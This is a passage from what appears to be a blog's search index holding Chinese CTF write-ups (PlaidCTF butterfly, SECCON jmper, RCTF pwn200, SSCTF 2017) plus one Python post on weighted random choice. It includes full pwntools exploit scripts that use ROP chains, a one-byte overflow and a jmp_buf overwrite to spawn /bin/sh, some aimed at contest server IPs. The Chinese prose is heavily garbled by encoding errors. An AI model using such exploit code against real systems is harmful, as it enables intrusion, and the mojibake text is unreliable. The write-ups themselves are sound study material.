butterfly","text":"0x00:è¿™ä¸ªé¢˜ç›®æ˜¯ä¹‹å‰å’Œ0x9A82å­¦å¼Ÿä¸€èµ·çœ‹çš„ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§bitä½ç¿»è½¬çš„é¢˜ç›®ï¼Œåœ¨è®¨è®ºäº†åå¤šåˆ†é’Ÿä¹‹åæ‰ææ˜ç™½ä¸€ä¸ªå›½é™…å‹äººçš„è§£æ³•ï¼Œå½“æ—¶è§‰å¾—ä»–è¿™ä¸ªè§£æ³•å¤ªå·§å¦™äº†~é‚åšä¸ªè®°å½•ã€‚ 0x01:ç¨‹åºå¤§æ¦‚çš„é€»è¾‘å¦‚ä¸‹ï¼Œç›´æ¥æ”¾IDA F5ä¹‹åçš„ä»£ç å¥½äº†ï¼Œéƒ¨åˆ†å˜é‡ä¸ºäº†é˜…è¯»æ–¹ä¾¿é‡å‘½åäº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl main(int argc, const char **argv, const char **envp){ signed int v3; // er14@1 __int64 addr; // rax@2 char bit; // bl@2 _BYTE *addr2; // rbp@2 void *base_addr; // r15@2 __int64 v8; // rax@5 char buffer; // [sp+0h] [bp-68h]@1 __int64 v11; // [sp+40h] [bp-28h]@1 v11 = *MK_FP(__FS__, 40LL); setbuf(_bss_start, 0LL); puts(&quot;THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?&quot;); v3 = 1; if ( fgets(&amp;buffer, 50, stdin) ) { addr = strtol(&amp;buffer, 0LL, 0); bit = addr; addr2 = (_BYTE *)(addr &gt;&gt; 3); base_addr = (void *)((addr &gt;&gt; 3) &amp; 0xFFFFFFFFFFFFF000LL); if ( mprotect(base_addr, 0x1000uLL, 7) ) { perror(&quot;mprotect1&quot;); } else { v3 = 1; *addr2 ^= 1 &lt;&lt; (bit &amp; 7); // 0000 0111 if ( mprotect(base_addr, 0x1000uLL, 5) ) { perror(&quot;mprotect2&quot;); } else { puts(&quot;WAS IT WORTH IT???&quot;); v3 = 0; } } } v8 = *MK_FP(__FS__, 40LL); if ( *MK_FP(__FS__, 40LL) == v11 ) LODWORD(v8) = v3; return v8;} ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œå¤§æ¦‚åšäº†è¿™å‡ ä»¶äº‹ï¼š è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨strtol()æŠŠè¾“å…¥è½¬æˆlongç±»å‹çš„å€¼ã€‚ æŠŠè¿™ä¸ªå€¼å³ç§»3 bitsï¼Œæˆ‘æ ‡è®°æˆäº†addr_baseã€‚ è°ƒç”¨mprotect()ï¼Œä¿®æ”¹base_addræŒ‡å‘çš„å†…å­˜å±æ€§ã€‚ addr2æœ€ä½3 bitsåè½¬ã€‚ å†æ¬¡è°ƒç”¨mprotect()ï¼Œä¿®æ”¹base_addræŒ‡å‘çš„å†…å­˜å±æ€§ã€‚ 0x02:Thinkingå¼€å§‹æˆ‘çš„æƒ³æ³•æ˜¯å†™scè¿›å»ç„¶åä¿®æ”¹ç¨‹åºæµç¨‹ï¼Œè·³è¿›å»æ‰§è¡Œã€‚ä½†æ˜¯å¹¶æ²¡æœ‰æå®šï¼Œåœ¨çœ‹äº†ä¸€ä»½wpä¹‹åè±ç„¶å¼€æœ—ã€‚è¿™é‡Œæ˜¯mainæ‰§è¡Œç»“æŸåè¿”å›çš„æ±‡ç¼–ä»£ç ï¼Œè€å¤–é‚£ä»½wpé‡Œçš„åšæ³•å°±æ˜¯ï¼Œä½¿ç”¨bitç¿»è½¬ï¼ŒæŠŠadd rsp,48hç¼–ç¨‹add rbp,48hï¼Œè¿™æ ·çš„è¯ï¼Œç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚æœ‰äº†ä¸Šé¢çš„åŸºç¡€ä¹‹åï¼Œç¬¬ä¸€æ¬¡ä¿®æ”¹æŒ‡ä»¤ï¼Œåé¢æ„é€ å¾ªç¯1å­—èŠ‚1å­—èŠ‚çš„æŠŠshellcodeå†™åˆ°åˆé€‚çš„ä½ç½®ï¼Œç„¶ååœ¨æœ€åä¸€æ¬¡ç›´æ¥retnåˆ°é‚£ä¸ªä½ç½®ï¼Œæ‰§è¡Œä»£ç ã€‚ 123456.text:0000000000400860 add rsp, 48h.text:0000000000400864 pop rbx.text:0000000000400865 pop r14.text:0000000000400867 pop r15.text:0000000000400869 pop rbp.text:000000000040086A retn 0x03:Exploit0x04:Reference butterfly-wp-by-r0p","link":"/2016/11/25/PlaidCTF-2016-butterfly/"},{"title":"PythonæŒ‡å®šæ¦‚ç‡è·å–éšæœºå…ƒç´ ","text":"0x00:æœ€è¿‘å†™fuzzeré‡åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªéœ€æ±‚ï¼Œç”Ÿæˆæ ·æœ¬çš„æ—¶å€™ï¼Œæœ‰äº›å…ƒç´ éœ€è¦å°½å¯èƒ½çš„å¤šå‡ºç°ï¼Œè€Œæœ‰äº›éœ€è¦å°‘ä¸€ç‚¹ï¼Œè¿™å°±æ¶‰åŠåˆ°æ¦‚ç‡çš„é—®é¢˜äº†ã€‚ç„¶è€Œç›´æ¥ä½¿ç”¨randomæ˜¯ä¸è¡Œçš„ï¼Œæš´åŠ›çš„åœ¨lib_listä¸Šåšæ–‡ç« ä¹Ÿä¸è¡Œï¼Œåè€Œæ•ˆç‡æ›´ä½ã€‚çœ‹åˆ°äº†python cookbookçš„ä¸¤ä¸ªä¾‹å­ã€‚ 0x01:ç¬¬ä¸€ç§ï¼Œç»™å®šæ¦‚ç‡123456789101112131415# -*- coding: utf-8 -*-#!/usr/bin/pythonimport randomdef random_pick(some_list,probabilities): x = random.uniform(0,1) cumulative_probability=0.0 for item,item_probability in zip(some_list,probabilities): cumulative_probability+=item_probability if x &lt; cumulative_probability: break return item ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°åˆ—è¡¨ï¼Œç¬¬äºŒä¸ªæ˜¯æ¦‚ç‡çš„åˆ—è¡¨ï¼Œæ¦‚ç‡åˆ—è¡¨é‡Œå…ƒç´ ç›¸åŠ å’Œå¿…é¡»ç­‰äº1æ¯”å¦‚è¿™ä¹ˆè°ƒç”¨ï¼š 1random_pick([1,2,3,4],[0.1,0.2,0.3,0.4]) å†™ä»£ç å¤§æ¦‚æµ‹äº†ä¸‹ï¼Œåœ¨å¤§é‡(&gt;10w)çš„æµ‹è¯•ä¸‹ï¼Œæ¯”è¾ƒç¨³å®šï¼ŒæŒ‰ç…§æŒ‡å®šæ¦‚ç‡äº§ç”Ÿå…ƒç´ ï¼Œæ¯”å¦‚xç­‰äº0.1å°±è¿”å›1ã€‚ä½†æ˜¯ä¸å¤ªé€‚åˆè¾ƒå¤šå‚æ•°çš„æƒ…å†µï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªæŒ‡å®šæ¦‚ç‡å•¥çš„ï¼Œè¿˜è¦è®¡ç®—å¥½æ¦‚ç‡å’Œä¸º1â€¦è›‹ç–¼ã€‚ ç¬¬äºŒç§ï¼Œç»™æƒé‡123456789import randomdef random_picks(sequence,relative_odds): table=[z for x,y in zip(sequence,relative_odds) for z in [x]*y] while True: yield random.choice(table)x=random_picks('ciao',[1,1,3,2])import itertoolsprint ''.join(itertools.islice(x,8)) ç¬¬äºŒç§æ ¹æ®æƒé‡æ¥è¿”å›ï¼Œåªè¦æ±‚æƒé‡æ˜¯éè´Ÿæ•´æ•°ï¼Œæ¯”è¾ƒå®¹æ˜“ä½¿ç”¨ï¼Œè™½ç„¶è¿˜æ˜¯è¦ä¸€ä¸ªä¸€ä¸ªç»™æƒé‡ï¼Œä½†æ˜¯æ€»æ¯”è¿˜è¦å»è®¡ç®—ä¸ªæ¦‚ç‡å’Œï¼Œå¥½å¾ˆå¤šã€‚","link":"/2017/12/30/Python%E6%8C%87%E5%AE%9A%E6%A6%82%E7%8E%87%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/"},{"title":"SECCON-2016 jmper","text":"0x00:ZCTF2017 çš„classçš„åŸå‹åº”è¯¥å°±æ˜¯è¿™ä¸ªé¢˜ç›®ï¼Œåœ¨å¤ç°çš„æ—¶å€™ï¼Œå°±ä»è¿™ä¸ªé¢˜ç›®å¼€å§‹åšèµ·ã€‚ 0x01ï¼švulnå…³é”®é€»è¾‘çš„ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102void __noreturn handle(){ char v0; // [sp+3h] [bp-1Dh]@13 char v1; // [sp+3h] [bp-1Dh]@23 int index; // [sp+4h] [bp-1Ch]@8 int v3; // [sp+8h] [bp-18h]@2 int i; // [sp+Ch] [bp-14h]@12 __int64 student_name; // [sp+10h] [bp-10h]@12 student *student; // [sp+18h] [bp-8h]@6 student_num = 0; while ( 1 ) // show student name { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(&quot;1. Add student.\\n2. Name student.\\n3. Write memo\\n4. Show Name\\n5. Show memo.\\n6. Bye :)&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); getchar(); if ( v3 != 1 ) break; if ( student_num &gt; 29 ) // check num { puts(&quot;Exception has occurred. Jump!&quot;); longjmp(jmpbuf, 0x1BF52); } student = (student *)malloc(48uLL); // add student student-&gt;id = student_num; student-&gt;name = malloc(32uLL); *(_QWORD *)(my_class + 8LL * student_num++) = student; } if ( v3 != 2 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // name student __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, &quot;Input name:&quot;); student_name = *(_QWORD *)(*(_QWORD *)(my_class + 8LL * index) + 40LL);// get ptr for ( i = 0; i &lt;= 32; ++i ) { v0 = getchar(); if ( v0 == '\\n' ) break; *(_BYTE *)student_name++ = v0; } } if ( v3 != 3 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // write memo __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, &quot;Input memo:&quot;); student_name = *(_QWORD *)(my_class + 8LL * index) + 8LL; for ( i = 0; i &lt;= 32; ++i ) // write one more byte { v1 = getchar(); if ( v1 == '\\n' ) break; *(_BYTE *)student_name++ = v1; } } if ( v3 != 4 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // show name __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, *(_QWORD *)(*(_QWORD *)(my_class + 8LL * index) + 40LL)); } if ( v3 != 5 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // show memo __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, *(_QWORD *)(my_class + 8LL * index) + 8LL); } exit(0);} ç»“æ„ä½“ï¼š 12345student struct { _QWORD id; _BYTE memo[32]; _QWORD *name;} ç¼–è¾‘memoçš„æ—¶å€™æœ‰ä¸ªoff by oneï¼Œå¯¼è‡´å¯ä»¥è¦†ç›–ä¸‹ä¸€ä¸ªstudentç»“æ„ä½“çš„nameæŒ‡é’ˆçš„æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ 0x02ï¼šthinkstudentç»“æ„ä½“åœ¨å†…å­˜é‡Œçš„å¸ƒå±€å¤§æ¦‚è¿™ä¸ªæ ·å­ï¼š 1234567891011121314151617stud1: -------------------------- | | | id | | memo_buf[0x20] | | name -----------------|----- | | | -------------------------- | | | |name1: | -------------------------- &lt;--| | | | name_buf | | | -------------------------- å…ˆåˆ†é…äº”ä¸ªè¿™æ ·çš„ç»“æ„ä½“ï¼Œç„¶åä¿®æ”¹student2çš„nameæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘student3çš„nameã€‚è¿™æ ·ï¼Œé€šè¿‡nameã€memoçš„writeå’ŒshowåŠŸèƒ½å°±å¯ä»¥è·å–ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›äº†ã€‚ æœ‰äº†è¿™ä¸ªåŸºç¡€åï¼Œå› ä¸ºç¨‹åºä½¿ç”¨äº†jmpbufferï¼Œä¼šæŠŠä¸€äº›å¯„å­˜å™¨ä¿¡æ¯åŠ å¯†åå­˜å‚¨åœ¨jmpbufferï¼Œæˆ‘ä»¬æœ‰ä»»æ„åœ°å€è¯»å†™ä¹‹åï¼š åªéœ€è¦leakå‡ºå’Œjmpbufferçš„åç§» æ³„éœ²å‡ºstored ripï¼Œå’ŒçœŸå®çš„rip xoråå¾—åˆ°secret xor å€¼ï¼Œ éšä¾¿æ³„éœ²ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæ ¹æ®libcç¡®å®šsystemå‡½æ•°åœ°å€ ç„¶åï¼Œç›´æ¥ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åè§¦å‘longjmpï¼Œå°±å¯ä»¥ä»£ç æ‰§è¡Œäº†ã€‚ 0x03ï¼šexploitwin10 subsystem ä¸Šæµ‹è¯•é€šè¿‡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *#context.log_level = 'debug'context.arch='amd64'LOCAL = Trueif LOCAL: p = process('./jmper',raw=False)else: p = remote('127.0.0.1',10001)elf = ELF('./jmper')libc = ELF('./libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')printf_got = elf.got['printf']def rerol(d): return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffffdef rol(d): return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffffdef add_student(): p.recvuntil(':)') p.sendline('1')def name_student(id,name): p.recvuntil(':)') p.sendline('2') p.recvuntil('ID:') p.sendline(str(id)) p.recvuntil('name:') p.sendline(str(name))def memo_student(id,memo): p.recvuntil(':)') p.sendline('3') p.recvuntil('ID:') p.sendline(str(id)) p.recvuntil('memo:') p.sendline(str(memo))def show_name(id): p.recvuntil(':)') p.sendline('4') p.recvuntil('ID:') p.sendline(str(id))def show_memo(id): p.recvuntil(':)') p.sendline('5') p.recvuntil('ID:') p.sendline(str(id))def exit_(): p.recvuntil(':)') p.sendline('6')def get_shell(): for __ in xrange(0,25): add_student() add_student()def main(): #raw_input('0x0000000000400B99') log.info('printf got : %s' % (hex(printf_got))) add_student() add_student() add_student() add_student() add_student() name_student(0,'A') name_student(1,'B') name_student(2,'C') name_student(3,'D') name_student(4,'E') memo_student(0,'a') memo_student(1,'b') memo_student(2,'c') memo_student(3,'d') memo_student(4,'e') #get jmp buffer offset memo_student(1,'c' * 0x20 + '\\xe8') name_student(1,'A') show_name(1) dump = p.recvline() jmp_buffer_lsw = ((ord(dump[1]) &amp;0xf0) &lt;&lt; 8) | 0x110 log.info(&quot;Got jmpbuffer offset %x&quot; % jmp_buffer_lsw) #get xor word rip_addr = jmp_buffer_lsw + 0x38 name_student(1,p16(rip_addr)) show_name(2) dump = p.recvline() rip_stored = unpack(dump[:8]) log.info(&quot;Got stored rip : %s&quot; % hex(rip_stored)) rip = rerol(rip_stored) secret_xor = rip ^ 0x400c31 log.info(&quot;Got xor vaule : %s&quot; % hex(secret_xor)) #rbx /bin/sh rip_addr = jmp_buffer_lsw name_student(1,p16(rip_addr)) name_student(2,&quot;/bin/sh&quot;) #leak addr and get system's addr name_student(1,p64(printf_got)) show_name(2) printf_addr = u64(p.recv(6).ljust(8,'\\x00')) log.info('leak printf : %s' % hex(printf_addr)) libc_base = printf_addr - libc.symbols['printf'] system_addr = libc_base + libc.symbols['system'] log.info('system addr : %s' % hex(system_addr)) new_rip = system_addr ^ secret_xor new_rip = rol(new_rip) log.info('New rip is : %s' % hex(new_rip)) memo_student(3,&quot;D&quot; * 0x20 + &quot;\\xc8&quot;) name_student(3,p16(jmp_buffer_lsw+0x38)) name_student(4,p64(new_rip)) get_shell() p.interactive()if __name__ == '__main__': main() 0x04ï¼šreferencewrite-ups-2016[ç¬¬ä¸‰å±ŠXCTFâ€”â€”éƒ‘å·ç«™ZCTFç¬¬ä¸€åæˆ˜é˜ŸWriteup]](http://bobao.360.cn/ctf/detail/186.html)","link":"/2017/03/06/SECCON-2016-jmper/"},{"title":"RCTF -- PWN200","text":"0x00:XCTFå¼€èµ›äº†ï¼Œåªçœ‹äº†pwnï¼Œè¿™æ¬¡è¿˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œæœ‰x86 x64 arm mips å¤šç§cpuæ„æ¶çš„pwnã€‚è‡ªå·±åªæå‡ºäº†pwn200 0x01:åŸºæœ¬ä¿¡æ¯x64 åŠ¨æ€é“¾æ¥ æœ‰è°ƒè¯•ç¬¦å·(æ€ªä¸å¾—æ˜¯æœ€ç®€å•çš„â€¦)å¼€å¯çš„ä¿æŠ¤å¦‚å›¾å¯ä»¥çœ‹åˆ°ã€‚è¿è¡Œä¸‹ï¼Œéšä¾¿ç»™ç‚¹è¾“å…¥:ç»è¿‡åˆ†æï¼Œå‘ç°é—®é¢˜å‡ºåœ¨echo()å‡½æ•°,è€Œä¸”è¿™ä¸ªbofçš„payloadå¤§æ¦‚çš„æ ¼å¼ï¼š 1payload = \"A\"*24+\"BBBBBB\"+\"\\x00\\x00\" 0x02:æ€è·¯åˆ©ç”¨æ„é€ çš„ROPé“¾å…ˆå» leak è¿œç¨‹æœåŠ¡å™¨ä¸Šlibcé‡Œçš„systemåœ°å€ï¼Œç„¶ååˆ©ç”¨ROPé“¾å†æ¬¡æŠŠ &quot;/bin/sh&quot; å’Œsystem()åœ°å€ å†™å…¥ç¨‹åºçš„.bssæ®µï¼Œæœ€åå†æ¬¡åˆ©ç”¨ROPé“¾å»æ‰§è¡Œ system(&quot;/bin/sh&quot;) ä½†æ˜¯è¦æ³¨æ„ï¼šx64çš„å‡½æ•°è°ƒç”¨ å‚æ•°ä¼ é€’é¡ºåºæ˜¯RDI RSI RDX RCX R8 R9ä¹‹åçš„å‚æ•°æ‰ç”¨æ ˆä¼ é€’ã€‚ åœ¨IDAä¸­çœ‹ä¸‹:æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ pwntoolsçš„ å»å¾—åˆ°ç¨‹åºä¸­write()å’Œread()è¿™äº›ç³»ç»Ÿè°ƒç”¨çš„gotï¼Œç”¨æ¥æ„é€ ROPã€‚è¿™æ—¶å€™è¦ä½¿ç”¨çš„æ˜¯ é€šç”¨å‹çš„ropgadsï¼Œå› ä¸ºæºç¨‹åºä¸­å¹¶æ²¡æœ‰ä¸€äº›è¾…åŠ©æ€§çš„ä¸œè¥¿ã€‚åœ¨åˆå§‹åŒ–libcçš„æ—¶å€™ï¼Œè¿™äº›æŒ‡ä»¤å¯ä»¥ä¸ºæˆ‘ä»¬æ‰€ç”¨æ¥æ„é€ ROPï¼Œè®¾ç½®å¥½å‚æ•°ã€‚å› ä¸ºä¹Ÿæ²¡æœ‰ç»™libcï¼Œæ‰€ä»¥è¦leak libcä¸­çš„å‡½æ•°åœ°å€ï¼Œpwntoolsçš„dynELFå¾ˆå¥½ç”¨ã€‚ 0x03:exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# coding=utf-8# author:muhe# http://www.cnblogs.com/0xmuhe/from pwn import *elf = ELF('./pwn200')p=remote('127.0.0.1',6666)#p = remote('180.76.178.48',6666)#p = process('./pwn200')addr1=0x40089Aaddr2=0x400880main_addr = 0x4007CDppppr=0x40089cbss_addr=0x601078got_write = elf.got['write']got_read = elf.got['read']flag=Truedef leak(address): global flag junk = \"A\"*24 p1=\"\" p1+=junk p1+=p64(ppppr) p1+=p64(addr1) p1+=p64(0)+p64(1)+p64(got_write)+p64(8)+p64(address)+p64(1) p1+=p64(addr2) p1+=\"\\x00\"*56 p1+=p64(main_addr) p.recvuntil('F\\n') p.send(p1) #raw_input() if flag: data = p.recv(8) flag=False else: p.recv(0x1b) data = p.recv(8) print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return datad = DynELF(leak, elf=ELF('./pwn200'))system_addr = d.lookup('system','libc')print \"system_addr=\" + hex(system_addr)#----------------write /bin/sh to .bss-----------------#junk = \"A\"*24payload=\"\"payload+=junkpayload+=p64(ppppr)payload+=p64(addr1)payload+=p64(0)+p64(1)+p64(got_read)+p64(24)+p64(bss_addr)+p64(0)# addr_junk_rbx_rbp_r12_r13_r14_r15#order:RDI RSI RDX RCX R8 R9payload+=p64(addr2)payload+=\"\\x00\"*56payload+=p64(main_addr)p.recvuntil('F\\n')print \"payload 1 ....\"#raw_input()p.send(payload)sleep(1)p.send(\"AAAABBBB\")p.send(\"/bin/sh\\0\")p.send(p64(system_addr))#raw_input()print \"sent ..\"#raw_input()sleep(1)#-----------------get shell --------------------------#junk = \"A\"*24payload2=\"\"payload2+=junkpayload2+=p64(ppppr)payload2+=p64(addr1)payload2+=p64(0)+p64(1)+p64(bss_addr+16)+p64(1)+p64(1)+p64(bss_addr+8)# addr_junk_rbx_rbp_r12_r13_r14_r15#order:RDI RSI RDX RCX R8 R9payload2+=p64(addr2)payload2+=\"\\x00\"*56payload2+=p64(main_addr)p.recvuntil('F\\n')#raw_input()print \"payload 2 ....\"p.send(payload2)print \"ok get shell\"p.interactive() åæ¥é‡åˆ°ä¸ªé—®é¢˜ï¼Œexpæ‰“æœ¬åœ°ï¼Œæˆ–è€…æ˜¯socketæ­å»ºèµ·æ¥çš„éƒ½å¯ä»¥æ‰“ï¼Œä½†æ˜¯è¿œç¨‹æœåŠ¡å™¨æ‰“ä¸äº†ã€‚ - -# å°´å°¬ 0x04:ç®—æ˜¯å­¦ä¹ äº†ä¸€æ³¢å§ï¼Œæœ‰æ”¶è·å°±æ˜¯å¥½çš„ã€‚","link":"/2015/11/16/RCTF-PWN200/"},{"title":"SSCTF-2017éƒ¨åˆ†Writeup","text":"0x00åˆšç»“æŸçš„SSCTF2017ï¼Œè‡ªå·±åªåšäº†ä¸€ç‚¹ã€‚ Pwn250æ ˆæº¢å‡ºï¼Œç®€å•ç²—æš´ï¼Œä½†æ˜¯ç¨‹åºæ˜¯é™æ€é“¾æ¥çš„ï¼Œåˆæœ‰NXä¿æŠ¤ï¼Œç›´æ¥ROPå°±å¥½äº†ã€‚ æ€è·¯å°±æ˜¯ï¼Œåœ¨.bssä¸Šæ„é€ å‚æ•°ï¼Œç„¶åä½¿ç”¨int 0x80èµ·shellã€‚ expå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding: utf-8 -*-#!/usr/bin/env python2from pwn import *context.log_level = 'debug'context.arch = 'i386'LOCAL = Falsemain_addr = 0x0804887Cint80_gad_addr = 0x0806cbb5#0x3a+4+4read_addr = 0x0806D510write_addr= 0x0806D580bss_addr = 0x080ECA35xor_eax_eax_ret = 0x080493a3pop_ebx_ret = 0x080481c9pop_ecx_ret = 0x080df1b9pop_edx_ret = 0x0806efbbadd_al_ret = 0x080b4f19mov_esp_ecx = 0x080b8c22if LOCAL: p = process('./250')#,env=env) #p = process('filename',raw=False) #this for Windows10 subsystemelse: p = remote('60.191.205.81',2017)def fuck(size,data): p.recvuntil('Size]') p.sendline(str(size)) p.recvuntil('Data]') p.sendline(str(data))def main(): ''' gdb.attach(p,&quot;&quot;&quot; b *0x08048986 c &quot;&quot;&quot;) ''' payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8) fuck(0x100,payload) p.send(&quot;/bin/sh\\0&quot;) sleep(2) payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr+10) + p32(8) fuck(0x100,payload) p.send(p32(bss_addr)) sleep(2) payload = 'A'*(0x3a+4) + p32(xor_eax_eax_ret)+p32(pop_ebx_ret)+p32(bss_addr) payload += p32(pop_ecx_ret) + p32(bss_addr+10) payload += p32(pop_edx_ret) + p32(0) payload += p32(add_al_ret) * 0xb payload += p32(int80_gad_addr) fuck(0x100,payload) p.interactive()if __name__ == '__main__': main() apk1ç¨‹åºä¼šåŠ å¯†ctf1.xlsxï¼ŒåŠ å¯†æ˜¯æ¯éš”0x100å­—ç¬¦åŠ å¯†ä¸€æ¬¡ã€‚ åŠ å¯†çš„å¤§æ¦‚é€»è¾‘æ˜¯ï¼š å…ˆè°ƒç”¨éªŒè¯å‡½æ•° private boolean verify(String arg11, String arg12)ï¼Œä¼šæ ¹æ®ç­¾åç®—å‡ºä¸€ä¸ªk1[40] æ ¹æ®è¾“å…¥çš„6ä½æ•°å­—ï¼Œå’Œk1æ“ä½œåå¾—åˆ°æ–°çš„k1 è¿›å…¥åŠ å¯†é€»è¾‘ï¼Œä½¿ç”¨æ–°çš„k1ä¸xlsxçš„æ¯éš”0x100çš„å­—ç¬¦ï¼Œå¾ªç¯äº¦æˆ–ã€‚ æ€è·¯å°±æ˜¯ï¼Œåå‘å…ˆæ¨ä¸€ç‚¹ï¼Œå¯ä»¥æ ¹æ®åŠ å¯†åçš„xlsxå’Œæ­£å¸¸çš„æ¯”å¯¹ï¼Œèƒ½å¾—åˆ°k1çš„å‰ä¸‰ä¸ªå­—èŠ‚ã€‚ ç„¶åæˆ‘æŠŠjavaä»£ç å¤åˆ¶å‡ºæ¥æ–°å»ºä¸€ä¸ªjavaçš„å·¥ç¨‹ï¼Œå»çˆ†ç ´6ä½æ•°å­—ï¼š 16ä½æ•°å­— ---&gt; å’Œk1ç”Ÿæˆæ–°çš„k1 ---&gt; ç„¶åæ¯”å¯¹å‰ä¸‰å­—èŠ‚ ç„¶åä½¿ç”¨private boolean encode(Context arg12)ï¼ŒæŠŠåŠ å¯†å‰åçš„æ–‡ä»¶åæ¢ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç›´æ¥è§£å‡ºæ¥ã€‚ apk2 loginä¸»è¦çš„å‡½æ•°åœ¨nativeå±‚ã€‚æŠŠè¾“å…¥çš„12å­—èŠ‚æ‰©å±•ä¸º16å­—èŠ‚ï¼Œç„¶ååˆ°javaå±‚å»éªŒè¯ï¼Œæ­£ç¡®çš„è¯ç»è¿‡AESè§£å¯†å¼¹å‡ºflagã€‚ ç»è¿‡åˆ†æï¼Œåªè¦ä½¿å¾—è¾“å…¥çš„12å­—èŠ‚ç»è¿‡å˜æ¢åï¼Œç­‰äº 01635e6c5f2378255f27356c11663165 å°±å¥½äº†ã€‚ ä¸»è¦çš„ç®—æ³•æ˜¯ï¼ŒæŠŠè¾“å…¥çš„12å­—èŠ‚åˆ†æˆ4ç»„ï¼Œæ¯ç»„3ä¸ªå­—èŠ‚ï¼Œæ¯ç»„çš„å˜åŒ–è§„å¾‹æ˜¯ 1234L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3FL[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xfL[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]L[flag[2] &amp;0x3f] = res[3] å†™è„šæœ¬åšè¿˜åŸæ“ä½œå°±è¡Œäº† 123456789101112131415161718192021222324252627282930313233343536373839404142res = [0x01,0x63,0x5e,0x6c, 0x5f,0x23,0x78,0x25, 0x5f,0x27,0x35,0x6c, 0x11,0x66,0x31,0x65]final = [0x21, 0x3A, 0x23, 0x24, 0x25, 0x26, 0x28, 0x29, 0x2B, 0x2D, 0x2A, 0x2F, 0x60, 0x7E, 0x5F, 0x5B, 0x5D, 0x7B, 0x7D, 0x3F, 0x3C, 0x3E, 0x2C, 0x2E, 0x40, 0x5E, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x5C, 0x27, 0x3B]'''L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3FL[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xfL[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]L[flag[2] &amp;0x3f] = res[3]'''def get_index(target): return final.index(target)def fuck(): flag = [] for i in xrange(0,len(res),4): ch0 = ((get_index(res[i] ^ 0x3f) &lt;&lt; 2) &amp; 0xff)+(get_index(res[i+1] ^ 0xf) &gt;&gt; 4) flag.append(ch0) ch1 = ((get_index(res[i+1] ^ 0xf) &lt;&lt; 4) &amp; 0xff) + (get_index(res[i+2]) &gt;&gt; 2) flag.append(ch1) ch2 = ((get_index(res[i+2]) &lt;&lt; 6 ) &amp; 0xff) + get_index(res[i+3]) flag.append(ch2) return flagout = &quot;&quot;for ch in fuck(): out += chr(ch)print out#VVe1lD0ne^-^ å®‰è£…apkåˆ°æ‰‹æœºä¸Šï¼Œç„¶åè¾“å…¥å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°flag Music 300 ä½ 